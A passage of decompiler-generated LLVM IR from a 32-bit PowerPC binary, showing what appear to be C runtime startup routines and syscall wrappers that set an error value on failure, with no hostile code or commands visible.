dec_label_pc_10008b98:                            ; preds = %dec_label_pc_10008b3c, %dec_label_pc_10008b8c
  %v0_10008b98 = phi i32 [ %v0_10008b98.pr, %dec_label_pc_10008b3c ], [ %v2_10008b90, %dec_label_pc_10008b8c ]
  %v3_10008b98 = icmp eq i32 %v0_10008b98, 0
  br i1 %v3_10008b98, label %dec_label_pc_10008bc4, label %dec_label_pc_10008ba0

dec_label_pc_10008ba0:                            ; preds = %dec_label_pc_10008b98
  %v3_10008bb0 = load i32, i32* %stack_var_-440, align 4
  %v0_10008bb4 = call i32 @__asm_mfcr()
  store i32 %v0_10008bb4, i32* %r3.global-to-local, align 4
  %v1_10008bb8 = call i32 @__asm_rlwinm(i32 %v0_10008bb4, i32 30, i32 31, i32 31)
  %v2_10008bbc = add i32 %v3_10008bb0, %v1_10008bb8
  store i32 %v2_10008bbc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008bd0

dec_label_pc_10008bc4:                            ; preds = %dec_label_pc_10008b98, %dec_label_pc_10008a10
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008bd0

dec_label_pc_10008bcc:                            ; preds = %dec_label_pc_10008a78, %dec_label_pc_10008ad4, %dec_label_pc_10008a54
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008bd0

dec_label_pc_10008bd0:                            ; preds = %dec_label_pc_10008bc4, %dec_label_pc_10008ba0, %dec_label_pc_10008b00, %dec_label_pc_10008bcc
  %v0_10008be0 = phi i32 [ 0, %dec_label_pc_10008bc4 ], [ %v2_10008bbc, %dec_label_pc_10008ba0 ], [ %v0_10008be0.pre, %dec_label_pc_10008b00 ], [ -1, %dec_label_pc_10008bcc ]
  ret i32 %v0_10008be0

; uselistorder directives
  uselistorder i32 %v1_10008ad0, { 1, 0 }
  uselistorder i32 %v2_10008a78, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v2_10008a54, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_10008a50, { 1, 0 }
  uselistorder i32 %v2_10008a34, { 2, 1, 3, 6, 5, 4, 7, 0, 8 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 3, 5, 4, 0, 6, 1, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 2 }
  uselistorder i32* %r11.global-to-local, { 3, 2, 0, 6, 7, 5, 4, 1, 8, 9 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 6, 7, 3, 4, 5, 8, 9 }
  uselistorder i32 (i32, i32)* @function_100092fc, { 1, 0 }
  uselistorder label %dec_label_pc_10008bd0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10008bcc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10008b98, { 1, 0 }
  uselistorder label %dec_label_pc_10008b8c, { 1, 0 }
  uselistorder label %dec_label_pc_10008ac0.dec_label_pc_10008ac0_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10008a40.dec_label_pc_10008a40_crit_edge, { 1, 0 }
}

define i32 @function_10008be4(i32 %arg1) local_unnamed_addr {
dec_label_pc_10008c34:
  %v3_10008c38 = load i32, i32* @global_var_100104b0.279, align 4
  %v3_10008c3c = icmp eq i32 %v3_10008c38, 0
  br i1 %v3_10008c3c, label %dec_label_pc_10008c4c, label %dec_label_pc_10008c44

dec_label_pc_10008c44:                            ; preds = %dec_label_pc_10008c34
  %v2_10008c48 = load i32, i32* @r4, align 4
  %v3_10008c48 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 %v2_10008c48)
  store i32 %v3_10008c48, i32* @r3, align 4
  br label %dec_label_pc_10008c4c

dec_label_pc_10008c4c:                            ; preds = %dec_label_pc_10008c34, %dec_label_pc_10008c44
  %v3_10008c50 = load i32, i32* @global_var_100104b4.280, align 4
  %v3_10008c54 = icmp eq i32 %v3_10008c50, 0
  br i1 %v3_10008c54, label %dec_label_pc_10008c4c.dec_label_pc_10008c64_crit_edge, label %dec_label_pc_10008c5c

dec_label_pc_10008c4c.dec_label_pc_10008c64_crit_edge: ; preds = %dec_label_pc_10008c4c
  %v0_10008c74.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10008c64

dec_label_pc_10008c5c:                            ; preds = %dec_label_pc_10008c4c
  %v2_10008c60 = load i32, i32* @r4, align 4
  %v3_10008c60 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 %v2_10008c60)
  br label %dec_label_pc_10008c64

dec_label_pc_10008c64:                            ; preds = %dec_label_pc_10008c4c.dec_label_pc_10008c64_crit_edge, %dec_label_pc_10008c5c
  %v0_10008c74 = phi i32 [ %v0_10008c74.pre, %dec_label_pc_10008c4c.dec_label_pc_10008c64_crit_edge ], [ %v3_10008c60, %dec_label_pc_10008c5c ]
  ret i32 %v0_10008c74

; uselistorder directives
  uselistorder i32 (i32, i32)* @unknown_0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10008c64, { 1, 0 }
  uselistorder label %dec_label_pc_10008c4c, { 1, 0 }
}

define i32 @function_10008c78() local_unnamed_addr {
dec_label_pc_10008c78:
  ret i32 0
}

define i32 @function_10008c80() local_unnamed_addr {
dec_label_pc_10008c80:
  %v0_10008c80 = load i32, i32* @r3, align 4
  ret i32 %v0_10008c80
}

define i32 @function_10008c84(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10008c84:
  store i32 %arg2, i32* @r30, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268471464, i32* @lr, align 4
  %v2_10008ca4 = call i32 @function_10009028(i32 1, i32 1)
  %v3_10008ca8 = icmp eq i32 %v2_10008ca4, -1
  br i1 %v3_10008ca8, label %dec_label_pc_10008cb0, label %dec_label_pc_10008cd0

dec_label_pc_10008cb0:                            ; preds = %dec_label_pc_10008c84
  %v0_10008cb4 = load i32, i32* @r30, align 4
  store i32 268471492, i32* @lr, align 4
  %v3_10008cc0 = call i32 @function_10009344(i32 ptrtoint ([10 x i8]* @global_var_1000ec98.281 to i32), i32 %v0_10008cb4)
  %v1_10008cc4 = load i32, i32* @r31, align 4
  %v4_10008cc4 = icmp eq i32 %v3_10008cc0, %v1_10008cc4
  br i1 %v4_10008cc4, label %dec_label_pc_10008cd0, label %dec_label_pc_10008ccc

dec_label_pc_10008ccc:                            ; preds = %dec_label_pc_10008cb0
  %v1_10008ccc = call i32 @function_1000b398(i32 %v3_10008cc0)
  br label %dec_label_pc_10008cd0

dec_label_pc_10008cd0:                            ; preds = %dec_label_pc_10008c84, %dec_label_pc_10008cb0, %dec_label_pc_10008ccc
  %v0_10008ce0 = phi i32 [ %v2_10008ca4, %dec_label_pc_10008c84 ], [ %v3_10008cc0, %dec_label_pc_10008cb0 ], [ %v1_10008ccc, %dec_label_pc_10008ccc ]
  ret i32 %v0_10008ce0

; uselistorder directives
  uselistorder label %dec_label_pc_10008cd0, { 2, 1, 0 }
}

define i32 @function_10008ce4(i32 %arg1) local_unnamed_addr {
dec_label_pc_10008ce4:
  %v3_10008d00 = load i32, i32* @global_var_100104b8.282, align 4
  %v3_10008d08 = icmp eq i32 %v3_10008d00, 0
  br i1 %v3_10008d08, label %dec_label_pc_10008d2c, label %dec_label_pc_10008ce4.dec_label_pc_10008d50_crit_edge

dec_label_pc_10008ce4.dec_label_pc_10008d50_crit_edge: ; preds = %dec_label_pc_10008ce4
  %v0_10008d60.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10008d50

dec_label_pc_10008d2c:                            ; preds = %dec_label_pc_10008ce4
  store i32 1, i32* @global_var_100104b8.282, align 4
  store i32 4096, i32* @global_var_100104ac.260, align 4
  %v1_10008d4c = call i32 @function_10005404(i32 268456964)
  br label %dec_label_pc_10008d50

dec_label_pc_10008d50:                            ; preds = %dec_label_pc_10008ce4.dec_label_pc_10008d50_crit_edge, %dec_label_pc_10008d2c
  %v0_10008d60 = phi i32 [ %v0_10008d60.pre, %dec_label_pc_10008ce4.dec_label_pc_10008d50_crit_edge ], [ %v1_10008d4c, %dec_label_pc_10008d2c ]
  ret i32 %v0_10008d60

; uselistorder directives
  uselistorder label %dec_label_pc_10008d50, { 1, 0 }
}

define i32 @function_10008d64(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10008d64:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %v1_10008d74 = mul i32 %arg2, 4
  store i32 %tmp, i32* @r30, align 4
  %v2_10008d80 = add i32 %tmp, %v1_10008d74
  %v0_10008d84 = load i32, i32* @r9, align 4
  store i32 %v0_10008d84, i32* @global_var_100104a4.283, align 4
  %v1_10008d88 = add i32 %v2_10008d80, 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r29.global-to-local, align 4
  store i32 %v1_10008d88, i32* @global_var_100104a8.278, align 4
  store i32 %arg6, i32* @global_var_100104b4.280, align 4
  store i32 %arg2, i32* @r26, align 4
  store i32 %arg1, i32* @r25, align 4
  store i32 %arg4, i32* @r28, align 4
  store i32 %arg5, i32* @r27, align 4
  %v2_10008dac = load i32, i32* %arg3, align 4
  %v4_10008db0 = icmp eq i32 %v1_10008d88, %v2_10008dac
  br i1 %v4_10008db0, label %dec_label_pc_10008db8, label %dec_label_pc_10008dbc

dec_label_pc_10008db8:                            ; preds = %dec_label_pc_10008d64
  store i32 %v2_10008d80, i32* @global_var_100104a8.278, align 4
  br label %dec_label_pc_10008dbc

dec_label_pc_10008dbc:                            ; preds = %dec_label_pc_10008d64, %dec_label_pc_10008db8
  %v2_10008dbc = ptrtoint i32* %stack_var_-168 to i32
  store i32 268471756, i32* @lr, align 4
  %v3_10008dc8 = call i32 @function_10006e24(i32 %v2_10008dbc, i32 0, i32 120)
  %storemerge.pre = load i32, i32* @global_var_100104a8.278, align 4
  br label %dec_label_pc_10008dd8

dec_label_pc_10008dd8:                            ; preds = %dec_label_pc_10008dd8, %dec_label_pc_10008dbc
  %storemerge = phi i32 [ %storemerge.pre, %dec_label_pc_10008dbc ], [ %v1_10008ddc, %dec_label_pc_10008dd8 ]
  %v1_10008dd8 = inttoptr i32 %storemerge to i32*
  %v2_10008dd8 = load i32, i32* %v1_10008dd8, align 4
  %v1_10008ddc = add i32 %storemerge, 4
  %v3_10008de0 = icmp eq i32 %v2_10008dd8, 0
  br i1 %v3_10008de0, label %dec_label_pc_10008de8, label %dec_label_pc_10008dd8

dec_label_pc_10008de8:                            ; preds = %dec_label_pc_10008dd8
  store i32 %v1_10008ddc, i32* %r29.global-to-local, align 4
  %v1_10008e1412 = inttoptr i32 %v1_10008ddc to i32*
  %v2_10008e1413 = load i32, i32* %v1_10008e1412, align 4
  %v3_10008e1816 = icmp eq i32 %v2_10008e1413, 0
  br i1 %v3_10008e1816, label %dec_label_pc_10008e20, label %dec_label_pc_10008df0

dec_label_pc_10008df0:                            ; preds = %dec_label_pc_10008de8, %dec_label_pc_10008e10
  %v0_10008e04 = phi i32 [ %v1_10008e10, %dec_label_pc_10008e10 ], [ %v1_10008ddc, %dec_label_pc_10008de8 ]
  %v0_10008df8 = phi i32 [ %v2_10008e14, %dec_label_pc_10008e10 ], [ %v2_10008e1413, %dec_label_pc_10008de8 ]
  %v2_10008df0 = icmp ugt i32 %v0_10008df8, 14
  br i1 %v2_10008df0, label %dec_label_pc_10008e10, label %dec_label_pc_10008df8

dec_label_pc_10008df8:                            ; preds = %dec_label_pc_10008df0
  %v1_10008df8 = mul i32 %v0_10008df8, 8
  %v2_10008e00 = add i32 %v1_10008df8, %v2_10008dbc
  store i32 %v2_10008e00, i32* @r3, align 4
  store i32 %v0_10008e04, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268471824, i32* @lr, align 4
  %v0_10008e0c = call i32 @function_10006d88()
  %v0_10008e10.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10008e10

dec_label_pc_10008e10:                            ; preds = %dec_label_pc_10008df0, %dec_label_pc_10008df8
  %v0_10008e10 = phi i32 [ %v0_10008e04, %dec_label_pc_10008df0 ], [ %v0_10008e10.pre, %dec_label_pc_10008df8 ]
  %v1_10008e10 = add i32 %v0_10008e10, 8
  store i32 %v1_10008e10, i32* %r29.global-to-local, align 4
  %v1_10008e14 = inttoptr i32 %v1_10008e10 to i32*
  %v2_10008e14 = load i32, i32* %v1_10008e14, align 4
  %v3_10008e18 = icmp eq i32 %v2_10008e14, 0
  br i1 %v3_10008e18, label %dec_label_pc_10008e20, label %dec_label_pc_10008df0

dec_label_pc_10008e20:                            ; preds = %dec_label_pc_10008e10, %dec_label_pc_10008de8
  %v1_10008e24 = call i32 @function_1000b4e8(i32 %v2_10008dbc)
  store i32 %v1_10008e24, i32* @r3, align 4
  store i32 268471852, i32* @lr, align 4
  %v1_10008e28 = call i32 @function_10008ce4(i32 %v1_10008e24)
  %v3_10008e30 = icmp eq i32 %tmp27, 0
  br i1 %v3_10008e30, label %dec_label_pc_10008e38, label %dec_label_pc_10008e3c

dec_label_pc_10008e38:                            ; preds = %dec_label_pc_10008e20
  br label %dec_label_pc_10008e3c

dec_label_pc_10008e3c:                            ; preds = %dec_label_pc_10008e20, %dec_label_pc_10008e38
  %v0_10008e40 = phi i32 [ %tmp27, %dec_label_pc_10008e20 ], [ 4096, %dec_label_pc_10008e38 ]
  store i32 %v0_10008e40, i32* @global_var_100104ac.260, align 4
  %v3_10008e48 = icmp eq i32 %tmp26, -1
  br i1 %v3_10008e48, label %dec_label_pc_10008e50, label %dec_label_pc_10008e84

dec_label_pc_10008e50:                            ; preds = %dec_label_pc_10008e3c
  store i32 268471892, i32* @lr, align 4
  %v1_10008e50 = call i32 @function_100092b4(i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  store i32 %v1_10008e50, i32* %r29.global-to-local, align 4
  store i32 268471900, i32* @lr, align 4
  %v0_10008e58 = call i32 @function_10009224()
  %v4_10008e5c = icmp eq i32 %v1_10008e50, %v0_10008e58
  br i1 %v4_10008e5c, label %dec_label_pc_10008e64, label %dec_label_pc_10008ea0

dec_label_pc_10008e64:                            ; preds = %dec_label_pc_10008e50
  store i32 268471912, i32* @lr, align 4
  %v1_10008e64 = call i32 @function_1000926c(i32 %v0_10008e58)
  store i32 %v1_10008e64, i32* %r29.global-to-local, align 4
  store i32 268471920, i32* @lr, align 4
  %v0_10008e6c = call i32 @function_100091dc()
  %v4_10008e70 = icmp eq i32 %v1_10008e64, %v0_10008e6c
  br i1 %v4_10008e70, label %dec_label_pc_10008e78.thread, label %dec_label_pc_10008ea0

dec_label_pc_10008e78.thread:                     ; preds = %dec_label_pc_10008e64
  br label %dec_label_pc_10008ed0

dec_label_pc_10008e84:                            ; preds = %dec_label_pc_10008e3c
  %v4_10008e88 = icmp eq i32 %tmp26, %tmp25
  br i1 %v4_10008e88, label %dec_label_pc_10008e90, label %dec_label_pc_10008ea0

dec_label_pc_10008e90:                            ; preds = %dec_label_pc_10008e84
  br label %dec_label_pc_10008ea0

dec_label_pc_10008ea0:                            ; preds = %dec_label_pc_10008e90, %dec_label_pc_10008e84, %dec_label_pc_10008e64, %dec_label_pc_10008e50
  store i32 268471984, i32* @lr, align 4
  %v2_10008eac = call i32 @function_10008c84(i32 0, i32 32768)
  store i32 268472000, i32* @lr, align 4
  %v2_10008ebc = call i32 @function_10008c84(i32 1, i32 32770)
  store i32 268472016, i32* @lr, align 4
  %v2_10008ecc = call i32 @function_10008c84(i32 2, i32 32770)
  br label %dec_label_pc_10008ed0

dec_label_pc_10008ed0:                            ; preds = %dec_label_pc_10008e78.thread, %dec_label_pc_10008ea0
  %v0_10008ed0 = load i32, i32* @r30, align 4
  %v1_10008ed0 = inttoptr i32 %v0_10008ed0 to i32*
  %v2_10008ed0 = load i32, i32* %v1_10008ed0, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v2_10008ed0, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 1092) to i32*), align 4
  %v0_10008efc = load i32, i32* @r27, align 4
  store i32 %v0_10008efc, i32* @global_var_100104b0.279, align 4
  br i1 false, label %dec_label_pc_10008f04, label %dec_label_pc_10008f7c

dec_label_pc_10008f04:                            ; preds = %dec_label_pc_10008ed0, %dec_label_pc_10008f04
  br i1 undef, label %dec_label_pc_10008f04, label %dec_label_pc_10008f7c

dec_label_pc_10008f7c:                            ; preds = %dec_label_pc_10008f04, %dec_label_pc_10008ed0
  %v0_10008f28 = load i32, i32* @r28, align 4
  call void @__pseudo_call(i32 %v0_10008f28)
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_10008f8c = call i32 @function_10004b48()
  %v2_10008f94 = inttoptr i32 %v0_10008f8c to i32*
  store i32 0, i32* %v2_10008f94, align 4
  br i1 icmp eq (i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 -27316), i32 0), label %dec_label_pc_10008fb4, label %dec_label_pc_10008fa8

dec_label_pc_10008fa8:                            ; preds = %dec_label_pc_10008f7c
  %v0_10008fa8 = call i32 @function_1000954c()
  %v2_10008fb0 = inttoptr i32 %v0_10008fa8 to i32*
  store i32 0, i32* %v2_10008fb0, align 4
  br label %dec_label_pc_10008fb4

dec_label_pc_10008fb4:                            ; preds = %dec_label_pc_10008f7c, %dec_label_pc_10008fa8
  %v0_10008fc0 = load i32, i32* @r25, align 4
  call void @__pseudo_call(i32 %v0_10008fc0)
  %v0_10008fcc = call i32 @function_10008858()
  ret i32 %v0_10008fcc

; uselistorder directives
  uselistorder i32 %v2_10008e14, { 1, 0 }
  uselistorder i32 %v1_10008e10, { 2, 1, 0 }
  uselistorder i32 %v1_10008ddc, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v2_10008dbc, { 1, 0, 2 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7 }
  uselistorder i32 ()* @function_10008858, { 0, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 1, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 1092, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_10008c84, { 2, 1, 0 }
  uselistorder i32 4096, { 0, 1, 6, 2, 3, 4, 5 }
  uselistorder i32 14, { 6, 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10008fb4, { 1, 0 }
  uselistorder label %dec_label_pc_10008f04, { 1, 0 }
  uselistorder label %dec_label_pc_10008ed0, { 1, 0 }
  uselistorder label %dec_label_pc_10008e3c, { 1, 0 }
  uselistorder label %dec_label_pc_10008e10, { 1, 0 }
  uselistorder label %dec_label_pc_10008df0, { 1, 0 }
  uselistorder label %dec_label_pc_10008dbc, { 1, 0 }
}

define i32 @function_10008fd0(i32 %arg1) local_unnamed_addr {
dec_label_pc_10008fd0:
  %v0_10008fd8 = load i32, i32* @lr, align 4
  %v1_10008fd8 = load i1, i1* @cr0_so, align 1
  %v2_10008fd8 = xor i1 %v1_10008fd8, true
  call void @__pseudo_cond_branch(i1 %v2_10008fd8, i32 %v0_10008fd8)
  %v0_10008fdc = call i32 @function_1000b504()
  ret i32 %v0_10008fdc

; uselistorder directives
  uselistorder i1* @cr0_so, { 1, 0 }
}

define i32 @function_10008fe0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10008fe0:
  %r31.global-to-local = alloca i32, align 4
  %v0_10008ff8 = call i32 @__asm_mfcr()
  %v1_10008ffc = and i32 %v0_10008ff8, 268435456
  %v3_10008ffc = icmp eq i32 %v1_10008ffc, 0
  store i32 %v0_10008ff8, i32* %r31.global-to-local, align 4
  br i1 %v3_10008ffc, label %dec_label_pc_10009014, label %dec_label_pc_10009008

dec_label_pc_10009008:                            ; preds = %dec_label_pc_10008fe0
  %v0_10009008 = call i32 @function_10004b48()
  %v0_1000900c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000900c = inttoptr i32 %v0_10009008 to i32*
  store i32 %v0_1000900c, i32* %v2_1000900c, align 4
  br label %dec_label_pc_10009014

dec_label_pc_10009014:                            ; preds = %dec_label_pc_10008fe0, %dec_label_pc_10009008
  %v0_10009024 = phi i32 [ %v0_10008ff8, %dec_label_pc_10008fe0 ], [ -1, %dec_label_pc_10009008 ]
  ret i32 %v0_10009024

; uselistorder directives
  uselistorder label %dec_label_pc_10009014, { 1, 0 }
}

define i32 @function_10009028(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10009028:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_10009038 = add i32 %arg2, -12
  %v2_10009040 = icmp ugt i32 %v1_10009038, 2
  %v2_10009044 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10009044, i32* %stack_var_-32, align 4
  br i1 %v2_10009040, label %dec_label_pc_10009074, label %dec_label_pc_10009064

dec_label_pc_10009064:                            ; preds = %dec_label_pc_10009028
  store i32 268472428, i32* @lr, align 4
  %v2_10009068 = call i32 @function_100090ac(i32 3)
  store i32 %v2_10009068, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10009094

dec_label_pc_10009074:                            ; preds = %dec_label_pc_10009028
  %v0_10009078 = call i32 @__asm_mfcr()
  %v1_1000907c = and i32 %v0_10009078, 268435456
  %v3_1000907c = icmp eq i32 %v1_1000907c, 0
  store i32 %v0_10009078, i32* %r31.global-to-local, align 4
  br i1 %v3_1000907c, label %dec_label_pc_10009094, label %dec_label_pc_10009088

dec_label_pc_10009088:                            ; preds = %dec_label_pc_10009074
  %v0_10009088 = call i32 @function_10004b48()
  %v0_1000908c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000908c = inttoptr i32 %v0_10009088 to i32*
  store i32 %v0_1000908c, i32* %v2_1000908c, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10009094

dec_label_pc_10009094:                            ; preds = %dec_label_pc_10009074, %dec_label_pc_10009064, %dec_label_pc_10009088
  %v0_10009098 = phi i32 [ %v0_10009078, %dec_label_pc_10009074 ], [ %v2_10009068, %dec_label_pc_10009064 ], [ -1, %dec_label_pc_10009088 ]
  ret i32 %v0_10009098

; uselistorder directives
  uselistorder i32 -12, { 4, 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_10009094, { 2, 0, 1 }
}

define i32 @function_100090ac(i32 %arg1) local_unnamed_addr {
dec_label_pc_100090ac:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_100090c0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_100090c0, i32* %stack_var_-32, align 4
  %v0_100090e0 = call i32 @__asm_mfcr()
  %v1_100090e4 = and i32 %v0_100090e0, 268435456
  %v3_100090e4 = icmp eq i32 %v1_100090e4, 0
  store i32 %v0_100090e0, i32* %r31.global-to-local, align 4
  br i1 %v3_100090e4, label %dec_label_pc_100090fc, label %dec_label_pc_100090f0

dec_label_pc_100090f0:                            ; preds = %dec_label_pc_100090ac
  %v0_100090f0 = call i32 @function_10004b48()
  %v0_100090f4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100090f4 = inttoptr i32 %v0_100090f0 to i32*
  store i32 %v0_100090f4, i32* %v2_100090f4, align 4
  br label %dec_label_pc_100090fc

dec_label_pc_100090fc:                            ; preds = %dec_label_pc_100090ac, %dec_label_pc_100090f0
  %v0_1000910c = phi i32 [ %v0_100090e0, %dec_label_pc_100090ac ], [ -1, %dec_label_pc_100090f0 ]
  ret i32 %v0_1000910c

; uselistorder directives
  uselistorder label %dec_label_pc_100090fc, { 1, 0 }
}

define i32 @function_10009110(i32 %arg1) local_unnamed_addr {
dec_label_pc_10009110:
  %r31.global-to-local = alloca i32, align 4
  br label %dec_label_pc_10009124

dec_label_pc_10009124:                            ; preds = %dec_label_pc_10009124.backedge, %dec_label_pc_10009110
  %v0_10009130 = call i32 @__asm_mfcr()
  %v1_10009134 = and i32 %v0_10009130, 268435456
  %v3_10009134 = icmp eq i32 %v1_10009134, 0
  store i32 %v0_10009130, i32* %r31.global-to-local, align 4
  br i1 %v3_10009134, label %dec_label_pc_10009124.backedge, label %dec_label_pc_10009140

dec_label_pc_10009140:                            ; preds = %dec_label_pc_10009124
  %v0_10009140 = call i32 @function_10004b48()
  %v0_10009144 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009144 = inttoptr i32 %v0_10009140 to i32*
  store i32 %v0_10009144, i32* %v2_10009144, align 4
  br label %dec_label_pc_10009124.backedge

dec_label_pc_10009124.backedge:                   ; preds = %dec_label_pc_10009140, %dec_label_pc_10009124
  br label %dec_label_pc_10009124
}

define i32 @function_1000914c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000914c:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009164 = call i32 @__asm_mfcr()
  %v1_10009168 = and i32 %v0_10009164, 268435456
  %v3_10009168 = icmp eq i32 %v1_10009168, 0
  store i32 %v0_10009164, i32* %r31.global-to-local, align 4
  br i1 %v3_10009168, label %dec_label_pc_10009180, label %dec_label_pc_10009174

dec_label_pc_10009174:                            ; preds = %dec_label_pc_1000914c
  %v0_10009174 = call i32 @function_10004b48()
  %v0_10009178 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009178 = inttoptr i32 %v0_10009174 to i32*
  store i32 %v0_10009178, i32* %v2_10009178, align 4
  br label %dec_label_pc_10009180

dec_label_pc_10009180:                            ; preds = %dec_label_pc_1000914c, %dec_label_pc_10009174
  %v0_10009190 = phi i32 [ %v0_10009164, %dec_label_pc_1000914c ], [ -1, %dec_label_pc_10009174 ]
  ret i32 %v0_10009190

; uselistorder directives
  uselistorder label %dec_label_pc_10009180, { 1, 0 }
}

define i32 @function_10009194(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10009194:
  %r31.global-to-local = alloca i32, align 4
  %v0_100091ac = call i32 @__asm_mfcr()
  %v1_100091b0 = and i32 %v0_100091ac, 268435456
  %v3_100091b0 = icmp eq i32 %v1_100091b0, 0
  store i32 %v0_100091ac, i32* %r31.global-to-local, align 4
  br i1 %v3_100091b0, label %dec_label_pc_100091c8, label %dec_label_pc_100091bc

dec_label_pc_100091bc:                            ; preds = %dec_label_pc_10009194
  %v0_100091bc = call i32 @function_10004b48()
  %v0_100091c0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100091c0 = inttoptr i32 %v0_100091bc to i32*
  store i32 %v0_100091c0, i32* %v2_100091c0, align 4
  br label %dec_label_pc_100091c8

dec_label_pc_100091c8:                            ; preds = %dec_label_pc_10009194, %dec_label_pc_100091bc
  %v0_100091d8 = phi i32 [ %v0_100091ac, %dec_label_pc_10009194 ], [ -1, %dec_label_pc_100091bc ]
  ret i32 %v0_100091d8

; uselistorder directives
  uselistorder label %dec_label_pc_100091c8, { 1, 0 }
}

define i32 @function_100091dc() local_unnamed_addr {
dec_label_pc_100091dc:
  %r31.global-to-local = alloca i32, align 4
  %v0_100091f4 = call i32 @__asm_mfcr()
  %v1_100091f8 = and i32 %v0_100091f4, 268435456
  %v3_100091f8 = icmp eq i32 %v1_100091f8, 0
  store i32 %v0_100091f4, i32* %r31.global-to-local, align 4
  br i1 %v3_100091f8, label %dec_label_pc_10009210, label %dec_label_pc_10009204

dec_label_pc_10009204:                            ; preds = %dec_label_pc_100091dc
  %v0_10009204 = call i32 @function_10004b48()
  %v0_10009208 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009208 = inttoptr i32 %v0_10009204 to i32*
  store i32 %v0_10009208, i32* %v2_10009208, align 4
  br label %dec_label_pc_10009210

dec_label_pc_10009210:                            ; preds = %dec_label_pc_100091dc, %dec_label_pc_10009204
  %v0_10009220 = phi i32 [ %v0_100091f4, %dec_label_pc_100091dc ], [ -1, %dec_label_pc_10009204 ]
  ret i32 %v0_10009220

; uselistorder directives
  uselistorder label %dec_label_pc_10009210, { 1, 0 }
}

define i32 @function_10009224() local_unnamed_addr {
dec_label_pc_10009224:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000923c = call i32 @__asm_mfcr()
  %v1_10009240 = and i32 %v0_1000923c, 268435456
  %v3_10009240 = icmp eq i32 %v1_10009240, 0
  store i32 %v0_1000923c, i32* %r31.global-to-local, align 4
  br i1 %v3_10009240, label %dec_label_pc_10009258, label %dec_label_pc_1000924c

dec_label_pc_1000924c:                            ; preds = %dec_label_pc_10009224
  %v0_1000924c = call i32 @function_10004b48()
  %v0_10009250 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009250 = inttoptr i32 %v0_1000924c to i32*
  store i32 %v0_10009250, i32* %v2_10009250, align 4
  br label %dec_label_pc_10009258

dec_label_pc_10009258:                            ; preds = %dec_label_pc_10009224, %dec_label_pc_1000924c
  %v0_10009268 = phi i32 [ %v0_1000923c, %dec_label_pc_10009224 ], [ -1, %dec_label_pc_1000924c ]
  ret i32 %v0_10009268

; uselistorder directives
  uselistorder label %dec_label_pc_10009258, { 1, 0 }
}

define i32 @function_1000926c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000926c:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009284 = call i32 @__asm_mfcr()
  %v1_10009288 = and i32 %v0_10009284, 268435456
  %v3_10009288 = icmp eq i32 %v1_10009288, 0
  store i32 %v0_10009284, i32* %r31.global-to-local, align 4
